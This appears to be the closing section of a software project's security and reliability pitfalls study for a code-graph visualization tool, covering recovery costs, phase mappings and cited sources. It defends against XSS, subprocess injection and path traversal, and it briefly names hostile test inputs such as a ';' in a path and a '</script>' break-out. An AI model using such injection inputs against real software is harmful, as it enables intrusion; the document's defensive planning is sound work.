| Stale graph committed | LOW | `codegraph sync` → re-scan → re-commit; add sync-before-read so it can't recur |
| graph.json schema break | MEDIUM | Add `schemaVersion` retroactively; write a migration/normalizer; pin agent skills to the version; regenerate across affected repos |
| XSS shipped in handoff HTML | HIGH | Patch escaping; **re-issue every distributed/committed HTML** (recipients may have the bad file); add adversarial fixture test; assume the old file is compromised |
| Subprocess injection present | HIGH | Replace `exec` with `execFile`+args everywhere; audit for any `shell:true`; add hostile-path tests; treat as security incident if tool ran on untrusted repos |
| Noncommercial dep contaminated chain | MEDIUM–HIGH | Remove/replace the dep; rebuild bundle; re-verify license chain; if already delivered to a client, disclose and re-ship a clean bundle |
| Hairball / perf collapse | MEDIUM | Add layout + collapse + memoization (may require viewer-state refactor — costlier the later it's done); add node-count threshold |
| Self-contained HTML bloat | MEDIUM | Build a stripped read-only viewer entry; re-emit handoff HTML; set a size-budget gate |
| Path traversal write | MEDIUM | Add containment check + `realpath`; audit what was written; restore any clobbered files |
| LLM egress leak | HIGH | Disable pane; add opt-in + redaction + preview; if client code already egressed, treat as a confidentiality incident and notify affected party |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Graph presented as ground truth | P0 (coverage fields) + P2 (caveats UI) | Limitations block renders; known dynamic/DI edge acknowledged; "verify in CodeGraph" works |
| Stale index → wrong graph | P0 (sync-before-read, provenance) + P2 (display) | Scan runs `sync`/`index`; `generatedAt`+SHA present and shown; stale-warning fires |
| Subprocess command injection | P0 (CodeGraph wrapper) | No `exec`/`shell:true`; hostile-path test (space + `;`) passes |
| HTML/JS injection in viewer | P2 (self-contained HTML) + P1 (no `dangerouslySetInnerHTML`) | Adversarial-symbol fixture executes nothing; data via `JSON.parse` of escaped blob |
| Large-graph hairball + perf | P1 (layout, memoization, collapse, threshold) | 500+ node repo: collapsed default, Profiler shows single-node re-render, threshold warning |
| License contamination | Cross-cutting Security (CI allowlist) + P2 (shipped-chain check) | License-checker fails on non-permissive; no GitNexus in `docs/architecture/` |
| graph.json schema churn / nondeterminism | P0 (schemaVersion, JSON Schema, stable sort) | Unchanged re-scan = empty diff; schema validates; consumers read `schemaVersion` |
| Self-contained HTML bloat | P2 (export/handoff) | Handoff HTML under size budget; no AI/editor code in viewer build |
| Path traversal on write | P0/P2 (bundle write) | Symlinked/`..` target can't escape output dir; fixed filenames |
| LLM code egress (AI pane) | P3 (AI pane entry criteria) | Egress opt-in; payload previewed; redaction runs; key from env; absent from handoff HTML |
| npm supply-chain | Cross-cutting Security | Lockfile committed; `audit` in CI; deps pinned |
| Node 25 crash | P0 (version guard) | Node 25 → clear actionable error, not opaque CodeGraph crash |

---

## Sources

- React Flow — Performance (official): https://reactflow.dev/learn/advanced-use/performance — re-render cascade, no fixed node limit, "hundreds" comfortable range
- xyflow/xyflow Discussion #4975 — improving performance with many nodes/edges; ~80-node unoptimized degradation, memoization wins
- xyflow/xyflow Issue #3044 — 10k nodes lag report (scale data point)
- Synergy Codes — Guide to optimize React Flow performance: https://www.synergycodes.com/blog/guide-to-optimize-react-flow-project-performance — ~10 FPS default / ~2 FPS heavy without memo; Profiler workflow
- React Flow — Layouting overview / dagre / ELK examples: https://reactflow.dev/learn/layouting/layouting — dagre = drop-in recommended, ELK = complex; custom-node dimension gotcha; dagre sub-flow open issue
- Cytoscape.js performance + WebGL renderer preview (2025-01): https://blog.js.cytoscape.org/2025/01/13/webgl-preview/ ; Issue #875 — ~3k OK / ~10k blank canvas data point
- "Best libraries for large graphs" (Medium, Stephen Weber) — SVG vs canvas vs WebGL thresholds; Sigma.js for thousands
- Hairball problem: Microsoft Research "Trimming the Hairball" + networkscience.wordpress.com + cambridge-intelligence.com/how-to-fix-hairballs — high-degree nodes, clustering/filtering/sampling
- colbymchenry/codegraph (GitHub repo + docs): https://github.com/colbymchenry/codegraph ; Indexing guide: https://colbymchenry.github.io/codegraph/guides/indexing/ ; CLI Reference (DeepWiki): https://deepwiki.com/colbymchenry/codegraph/4-cli-reference — `status` counts, three staleness layers, "script outside agent session → run `sync` first," filesystem-based change detection, Node 25.x hard-exit
- arXiv 2603.27277 "Codebase-Memory: Tree-Sitter-Based Knowledge Graphs" — explicit: "captures static structure only; runtime behavior, reflection, and dynamic dispatch are not represented"; name-based cascade limits
- arXiv 2407.07804 "Call Graph Soundness in Android Static Analysis" — 13 tools miss ~61% of dynamically-executed methods; library methods most-missed
- Wikipedia "Call graph" — dynamic dispatch / first-class functions / function pointers require alias analysis (chicken-and-egg) → inherent incompleteness
- Node.js child_process docs (official): https://nodejs.org/api/child_process.html — exec spawns a shell; execFile/spawn no shell by default; `shell:true` reintroduces injection; Windows `.bat`/`.cmd` caveat (DEP0190)
- securecodingpractices.com / nodejs-security.com — prefer execFile/spawn + args array over escaping; validate input as defense-in-depth
- OWASP XSS Prevention + Filter Evasion Cheat Sheets: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html — HTML-entity encoding does NOT protect inside `<script>`
- Sophie Alpert "Preventing XSS when embedding JSON in HTML" (2012): https://sophiebits.com/2012/08/03/preventing-xss-json — `</script>` break-out; escape `</`→`<\/` or `s`cript
- vite-plugin-singlefile: https://github.com/richardtallent/vite-plugin-singlefile + npm — "not recommended for most production"; `removeViteModuleLoader`, `minify`; base64 ~33% overhead
- React Flow / xyflow licensing: https://github.com/xyflow/xyflow/discussions/3397 + https://xyflow.com/pro-license — MIT, free commercial, no paid-gated features, attribution removal is paid-plan only
- D2 license: https://github.com/terrastruct/d2/blob/master/LICENSE.txt — MPL-2.0 (file-level copyleft)
- GitNexus license: https://github.com/abhigyanpatwari/GitNexus/blob/main/LICENSE + https://polyformproject.org/licenses/noncommercial/1.0.0 — PolyForm Noncommercial 1.0.0, source-available, commercial use requires paid license
- PROJECT.md (this project) — hard constraints: all-permissive client chain, GitNexus internal-only, subprocess/path/HTML-injection/supply-chain/opt-in-egress security surface

---
*Pitfalls research for: local code-graph visualization tool (arch-viz-studio)*
*Researched: 2026-05-31*
